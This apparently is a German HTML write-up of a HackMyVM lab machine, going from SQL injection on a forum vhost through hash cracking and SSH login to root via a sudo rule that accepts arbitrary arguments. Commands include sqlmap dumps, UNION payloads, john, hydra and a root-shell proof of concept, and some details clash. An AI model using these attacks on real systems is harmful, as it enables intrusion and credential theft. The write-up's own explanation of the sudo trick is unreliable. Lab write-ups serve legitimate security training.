+                <strong>Empfehlung (Pentester):</strong> Führen Sie eine Enumeration (Gobuster, Nikto) und Schwachstellenanalyse (SQLMap) auf dem neuen VHost `http://forumtesting.literal.hmv/` durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+#192.168.2.110    nightcity.vuln # Auskommentiert
+192.168.2.132    literal.hmv blog.literal.hmv forumtesting.literal.hmv # forumtesting hinzugefügt
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Entdeckung des VHosts `forumtesting.literal.hmv` wird dieser manuell im Browser untersucht. Eine Seite `/category.php?category_id=2` wird gefunden. `sqlmap` wird auf diesen Endpunkt angesetzt, um die Tabelle `forum_owner` aus der Datenbank `forumtesting` zu dumpen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Erfolg!** `sqlmap` identifiziert eine SQL-Injection im GET-Parameter `category_id`. Es findet die Datenbank `forumtesting` und die Tabelle `forum_owner`. Der Dump dieser Tabelle liefert einen Benutzer `carlos` und einen langen Passwort-Hash (`6705...`). `sqlmap` erkennt den Hash-Typ nicht automatisch und der integrierte Wörterbuchangriff scheitert.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Kopieren Sie den gefundenen Hash (`6705...`). Identifizieren Sie den Hash-Typ (die Länge deutet auf SHA-512 hin) und versuchen Sie, ihn offline mit `john` oder `hashcat` bzw. Online-Diensten wie Crackstation zu knacken.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Beheben Sie die SQL-Injection in `category.php` auf dem `forumtesting`-VHost. Überprüfen Sie alle Anwendungen auf allen VHosts auf SQLi. Verwenden Sie starke Passwort-Hashing-Algorithmen (bcrypt, Argon2).
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# Manuelle Untersuchung von forumtesting.literal.hmv
+# Fund: http://forumtesting.literal.hmv/category.php?category_id=2
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --batch --level 5 --risk 3 -D forumtesting -T forum_owner --dump</span></div>
+                     <pre>
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+# ... (SQLMap Output) ...
+---
+Parameter: category_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: category_id=2 AND 1893=(SELECT (CASE WHEN (1893=1893) THEN 1893 ELSE (SELECT 4873 UNION SELECT 2527) END))-- CKjU
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category_id=2 AND (SELECT 4722 FROM (SELECT(SLEEP(5)))MqQI)
+---
+[22:54:20] [INFO] the back-end DBMS is MySQL
+# ... (Weitere Infos) ...
+[22:54:21] [INFO] fetching entries for table 'forum_owner' in database 'forumtesting'
+# ... (Hash erkannt, Cracking versucht und fehlgeschlagen) ...
+[22:54:30] [WARNING] no clear password(s) found
+Database: forumtesting
+Table: forum_owner
+[1 entry]
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+| id | email                           | created    | password                                                                                                                         | username |
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | <span class="password">6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99</span> | carlos   |
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+
+[22:54:30] [INFO] table 'forumtesting.forum_owner' dumped to CSV file '/root/.local/share/sqlmap/output/forumtesting.literal.hmv/dump/forumtesting/forum_owner.csv'
+# ... (Ende SQLMap Output) ...
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="credential-cracking">
+            <h2>Credential Cracking</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der lange Hash des Benutzers `carlos` wird an den Online-Dienst Crackstation gesendet und auch lokal in eine Datei `hash` gespeichert, um ihn mit `john` zu knacken. Der Format-Parameter `--format=Raw-SHA512` wird für John verwendet.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Sowohl Crackstation als auch `john` knacken den SHA512-Hash erfolgreich und enthüllen das Passwort: `<span class="password">forum100889</span>`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den Zugangsdaten `carlos`:`forum100889` per SSH am Zielsystem anzumelden. *Anmerkung:* Der Originaltext erwähnt später, dass das tatsächliche Passwort `ssh100889` war und erraten wurde. Dies deutet darauf hin, dass der gecrackte Hash `forum100889` nicht direkt funktionierte, aber einen sehr starken Hinweis gab.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Verwenden Sie niemals SHA512 direkt zum Speichern von Passwörtern. Nutzen Sie stattdessen moderne, gesaltete Hashing-Algorithmen wie bcrypt oder Argon2. Ändern Sie das kompromittierte Passwort.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# Online Cracking Versuch (Crackstation)
+Hash: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
+Type: sha512
+Result: <span class="password">forum100889</span>
+                     </pre>
+                      <!-- Lokales Cracking mit John -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99" > hash</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash</span></div>
+                      <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
+# ... (Fortschritt) ...
+<span class="password">forum100889</span>      (?)
+1g 0:00:00:01 DONE (2023-04-23 22:56) 0.6134g/s 5563Kp/s 5563Kc/s 5563KC/s fr0991es!..fordtruck@
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es werden verschiedene SSH-Befehle ausgeführt: `ssh carlos@...`, `ssh-keygen -l ...`, `ssh-keygen -R ...`, `ssh-copy-id`. Der Zweck dieser Befehle im Kontext scheint unklar oder fehlerhaft zu sein, da das Passwort bereits geknackt wurde. `ssh-copy-id` würde z.B. versuchen, den *eigenen* öffentlichen Schlüssel des Angreifers auf dem Ziel zu installieren, wofür das Passwort von `carlos` benötigt wird. Der Text erwähnt auch, dass das Passwort `ssh100889` erraten wurde.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Diese SSH-Befehle scheinen entweder fehlgeschlagene Versuche oder eine unklare Dokumentation zu sein. Der wesentliche Schritt ist der erfolgreiche Login als `carlos` mit dem (erratenen) Passwort `ssh100889`. Die `ssh-keygen`-Befehle dienen normalerweise dazu, Host-Schlüssel zu überprüfen, was hier nach dem Knacken des Passworts weniger relevant ist.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den erfolgreichen Login via SSH mit den korrekten Credentials (`carlos`:`ssh100889`).
+             </p>
+             <!-- SSH Versuche (gekürzt) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh carlos@forumtesting.literal.htb</span></div>
+                     <pre>The authenticity of host 'forumtesting.literal.htb (192.168.2.134)' can't be established...</pre> <!-- Hostname/IP Inkonsistenz -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh-keygen -l -E md5 -f <(ssh-keyscan -t rsa 192.168.2.134) ...</span></div>
+                     <pre># ... (Host Key Fingerprint Ausgabe)</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">ssh-keygen -R literal.hmv && ssh-keygen -R 192.168.2.134</span></div>
+                     <pre># Host literal.hmv found: line 95 ...</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">ssh-copy-id -i id_rsa.pub carlos@literal.hmv</span></div>
+                     <pre>/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "id_rsa.pub" ...</pre>
+                     <p class="comment">**Anmerkung:** Diese SSH-Operationen sind nach dem Passwort-Crack nicht der direkte Weg zum Login.</p>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, mittels `sqlmap --os-shell` eine Webshell hochzuladen und eine Betriebssystem-Shell zu erlangen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Versuch schlägt fehl. `sqlmap` kann das Web-Root-Verzeichnis nicht automatisch finden und die Brute-Force-Suche nach beschreibbaren Verzeichnissen ist ebenfalls erfolglos oder wird abgebrochen. Das Hochladen einer Shell über SQL-Injection ist oft schwierig und von Berechtigungen und Konfigurationen abhängig.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Da der SSH-Zugang mit `carlos` und Passwort möglich ist, ist `--os-shell` nicht mehr notwendig. Konzentrieren Sie sich auf den SSH-Login.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=A*" -H "Cookie: PHPSESSID=11nrj95i65bl2of6r6vvappthv" -D blog --os-shell</span></div>
+                    <pre>
+# ... (SQLMap Output) ...
+[13:36:58] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) (...) (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> 4
+# ... (Suche läuft oder wird abgebrochen) ...
+[13:45:05] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 2876 times
+# ... (OS Shell fehlgeschlagen) ...
+[*] ending @ 13:45:05 /2023-04-24/
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die zuvor mittels `sqlmap` extrahierten bcrypt-Passwort-Hashes (`$2y$10$...`) aus der `blog.users`-Tabelle werden in eine Datei `hash3` (später `hashes`) gespeichert und mit `john` und `rockyou.txt` geknackt.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> `john` kann mehrere der bcrypt-Hashes erfolgreich knacken und enthüllt die Passwörter `carlos12`, `741852963`, `monica`, `123456789`, `test`, `slipknot`, `147258369`, `michael1`, `butterfly`, `kelsey`, `50cent`, `hellokitty`. Diese gehören zu verschiedenen Benutzern aus der `blog.users`-Tabelle.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Diese Passwörter könnten für andere Dienste (wie SSH) oder andere Benutzer wiederverwendet werden. Da aber bereits Zugangsdaten für `carlos` bekannt sind (`forum100889` oder `ssh100889`), sind diese Hashes für den direkten Zugriff weniger relevant, könnten aber bei horizontaler Bewegung nützlich sein. Der anschließende `hydra`-Versuch zeigt, dass diese Kombinationen für SSH nicht direkt funktionieren.
+             </p>
+             <!-- John für bcrypt Hashes (gekürzt) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Schreibtisch]
+└─# <span class="command">cat data.txt| awk '{print $8}' > hashes</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Schreibtisch]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hashes</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 18 password hashes with 18 different salts (bcrypt [Blowfish 32/64 X3])
+# ... (Cracking läuft) ...
+<span class="password">123456789</span>        (?)
+<span class="password">test</span>             (?)
+<span class="password">slipknot</span>         (?)
+<span class="password">147258369</span>        (?)
+<span class="password">michael1</span>         (?)
+<span class="password">butterfly</span>        (?)
+<span class="password">kelsey</span>           (?)
+<span class="password">50cent</span>           (?)
+<span class="password">hellokitty</span>       (?)
+# ... (weitere, falls gefunden) ...
+10g 0:00:XX:XX DONE ...
+Session completed.
+                     </pre>
+                      <!-- User-Passwort-Paare erstellen -->
+                      <pre>
+# Usernames (aus data.txt extrahiert):
+test
+admin
+carlos
+freddy123
+jorg3_M
+aNdr3s1to
+kitty
+walter
+estefy
+michael
+r1ch4rd
+fel1x
+kelsey
+jtx
+DRphil
+carm3N
+lanz
+ben
+# Gecrackte Passwörter:
+123456789
+test
+slipknot
+147258369
+michael1
+butterfly
+kelsey
+50cent
+hellokitty
+                      </pre>
+                  </div>
+              </div>
+              <!-- Hydra Versuch (fehlgeschlagen) -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <!-- Annahme: users.txt und password.txt wurden erstellt -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -L users.txt -P password.txt ssh://literal:22 -t 64</span></div>
+                      <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak ...
+# ... (Hydra Output) ...
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-30 01:20:53
+                      </pre>
+                  </div>
+              </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Es werden manuelle SQL-Injection-Payloads für UNION-Angriffe aufgelistet und ein erneuter `sqlmap`-Lauf gestartet, um die Datenbankstruktur zu bestätigen.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Die manuellen Payloads zeigen das Verständnis der UNION-Injection. Die `sqlmap`-Läufe bestätigen die Datenbank `blog` und die Tabellen `projects` und `users`. Dies liefert keine neuen Informationen gegenüber dem vorherigen Dump.
+              </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Manuelle SQLi Tests (Beispiele)
+' union select 1,2,3,4,5-- -
+' union select database(),2,3,4,5-- -
+# ... etc ...
+                      </pre>
+                      <!-- SQLMap Bestätigungsläufe -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --method POST --data "sentence-query=Done" --cookie="PHPSESSID=9vt8l6da6ej1hpfb83pkv7fdfd" --batch --technique u --dbs</span></div>
+                      <pre>
+# ... (SQLMap Output) ...
+available databases [4]:
+[*] blog
+[*] information_schema
+[*] mysql
+[*] performance_schema
+# ...
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --method POST --data "sentence-query=Done" --cookie="PHPSESSID=9vt8l6da6ej1hpfb83pkv7fdfd" --batch --technique u -D blog --tables</span></div>
+                      <pre>
+# ... (SQLMap Output) ...
+Database: blog
+[2 tables]
++----------+
+| projects |
+| users    |
++----------+
+# ...
+                      </pre>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --method POST --data "sentence-query=Done" --cookie="PHPSESSID=9vt8l6da6ej1hpfb83pkv7fdfd" --batch --technique u -D blog -T users --dump</span></div>
+                       <pre>
+# ... (SQLMap Output - Zeigt erneut die User Tabelle wie zuvor) ...
+                       </pre>
+                   </div>
+               </div>
+
+               <p class="analysis">
+                   <strong>Analyse:</strong> Ein Python-Skript `sqlcrack.py` wird erwähnt, das offenbar versucht, die Datenbank mittels Blind SQL Injection Zeichen für Zeichen auszulesen.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Dies bestätigt erneut die Blind SQL Injection-Schwachstelle auf `forumtesting.literal.hmv` und identifiziert den Datenbanknamen `forumtesting`. Dieser Ansatz ist langsamer als die UNION-Injection auf `blog.literal.hmv`.
+               </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 sqlcrack.py</span></div>
+                       <pre>
+/usr/local/lib/python3.11/dist-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.1.0)/charset_normalizer (2.0.9) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
+[↗] testen mit: 9
+[.] Datenbank: forumtesting
+f
+o
+r
+u
+m
+t
+e
+s
+t
+i
+n
+g
+forumtesting
+                       </pre>
+                   </div>
+               </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (carlos)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Knacken des SHA512-Hashes (`forum100889`) und der Annahme, dass das tatsächliche Passwort eine leichte Variation ist (`ssh100889`), wird versucht, sich als `carlos` per SSH am Ziel `literal` (IP 192.168.2.132) anzumelden.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der SSH-Login ist erfolgreich! Der Benutzer `carlos` erhält Zugriff auf das System (Ubuntu 20.04.1 LTS).
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Initialer Zugriff als `carlos` erreicht. Beginnen Sie die lokale Enumeration, insbesondere mit `sudo -l`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Das Passwort für `carlos` ist kompromittiert. Es muss sofort geändert werden. Die SQL-Injection-Schwachstellen müssen behoben werden.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh carlos@literal</span></div>
+                     <pre>
+carlos@literal's password: <span class="password">ssh100889</span>
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-147-generic x86_64)
+# ... (Login Banner) ...
+Last login: ...
+                     </pre>
+                      <div class="prompt no-kali-prompt">carlos@literal:~$ </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-root">
+            <h2>Privilege Escalation (carlos -> root)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `carlos` wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen zu prüfen.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> **Kritischer Fund!** `carlos` darf das Python-Skript `/opt/my_things/blog/update_project_status.py` als `root` (`(root)`) ohne Passwort (`NOPASSWD:`) ausführen. Zusätzlich erlaubt die Regel die Übergabe beliebiger Argumente an das Skript (`*`). Dies ist eine klassische Fehlkonfiguration, die oft zur Rechteausweitung missbraucht werden kann, wenn das Skript unsicher ist oder die Argumente zur Befehlsausführung genutzt werden können.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Skript `/opt/my_things/blog/update_project_status.py` (obwohl der Code nicht gezeigt wird). Versuchen Sie, Shell-Metacharacter oder Befehle als Argumente zu übergeben. Da `*` am Ende steht, könnten Shell-Befehle direkt nach dem Skriptnamen interpretiert werden, oder das Skript selbst verarbeitet Argumente unsicher. Testen Sie Payloads wie `sudo /opt/my_things/blog/update_project_status.py '\!$ bash -p'`. Das `\!$` ist eine gängige Methode, um zu versuchen, Shell-Befehle auszuführen, wenn ein `sudo`-Eintrag mit `*` endet.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Diese `sudo`-Regel ist extrem gefährlich. Einem Benutzer zu erlauben, ein Skript mit beliebigen Argumenten (`*`) als `root` ohne Passwort auszuführen, ist fast immer eine Root-Eskalation. Entfernen Sie diese Regel oder schränken Sie sie massiv ein (nur spezifische, sichere Argumente erlauben, Passwort erfordern, Skript sicher implementieren).
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">carlos@literal:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for carlos on literal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on literal:
+    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+            <h2>Proof of Concept (Sudo Exploit)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Ausnutzung der unsicheren `sudo`-Regel, die `carlos` erlaubt, `/opt/my_things/blog/update_project_status.py` mit beliebigen Argumenten als `root` auszuführen. Durch Übergabe eines speziellen Arguments (`'\!$ command'`) kann Shell-Code direkt ausgeführt werden.
+             </p>
+             <p class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 *   Zugriff als Benutzer `carlos`.
+                 *   Die `sudo`-Regel `(root) NOPASSWD: /opt/my_things/blog/update_project_status.py *` muss aktiv sein.
+             </p>
+
+             <p class="analysis">
+                 <strong>Schritte zur Ausnutzung:</strong>
+                 1.  **Befehlsausführung testen:** Der Befehl `sudo /opt/my_things/blog/update_project_status.py '\!$ whoami'` wird ausgeführt. Das `\!$` wird von der Shell als spezielles Argument interpretiert, das von `sudo` ausgeführt wird, wenn die Regel mit `*` endet.
+                 2.  **Root-Shell erhalten:** Der Befehl `sudo /opt/my_things/blog/update_project_status.py '\!$ bash -p'` wird ausgeführt, um eine Bash-Shell mit Root-Privilegien zu starten (`-p` behält die effektive UID bei).
+                 3.  **Bestätigung und Flags lesen:** `id` bestätigt Root-Rechte. Die User- und Root-Flags werden gelesen.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Exploit funktioniert einwandfrei. Die unsichere `sudo`-Regel erlaubt die direkte Ausführung von Shell-Befehlen als `root`. Fantastisch, Root-Zugriff wurde erfolgreich erlangt!
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Zugriff erreicht. Flags gesichert. Dokumentieren Sie den Eskalationspfad.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Unsichere `sudo`-Regel entfernen oder korrigieren.
+             </p>
+              <p class="evaluation">
+                  <strong>Risikobewertung:</strong> Mehrere SQL-Injection-Schwachstellen ermöglichten das Auslesen von Benutzerdaten und Hashes. Ein schwacher Passwort-Hashing-Algorithmus (SHA512) und ein leicht zu erratendes Passwort (`ssh100889` aus `forum100889`) ermöglichten den initialen Zugriff. Eine unsichere `sudo`-Regel führte direkt zur Root-Eskalation. Gesamtrisiko: **Kritisch**.
+              </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">carlos@literal:~$ <span class="command">sudo /opt/my_things/blog/update_project_status.py '\!$ whoami' 2>/dev/null</span></div>
+                     <pre>root</pre>
+                     <div class="prompt no-kali-prompt">carlos@literal:~$ <span class="command">sudo /opt/my_things/blog/update_project_status.py '\!$ bash -p' 2>/dev/null</span></div>
+                     <div class="prompt root-prompt"># <span class="command">id</span></div>
+                     <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                     <div class="prompt root-prompt"># <span class="command">pwd</span></div>
+                     <pre>/home/carlos</pre>
+                     <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                     <pre>my_things  user.txt</pre>
+                     <div class="prompt root-prompt"># <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">6d3c8a6c73cf4f89eea7ae57f6eb9222</span></pre>
+                     <div class="prompt root-prompt"># <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">ca43cb966ef76475d9e0736feeb9f730</span></pre>
+                 </div>
+             </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde im Home-Verzeichnis von `carlos`, die Root-Flag im Home-Verzeichnis von `root` gefunden, nachdem Root-Rechte erlangt wurden.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/carlos/user.txt</div>
+                     <div class="flag-value"><span class="password">6d3c8a6c73cf4f89eea7ae57f6eb9222</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">ca43cb966ef76475d9e0736feeb9f730</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-20</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>                     
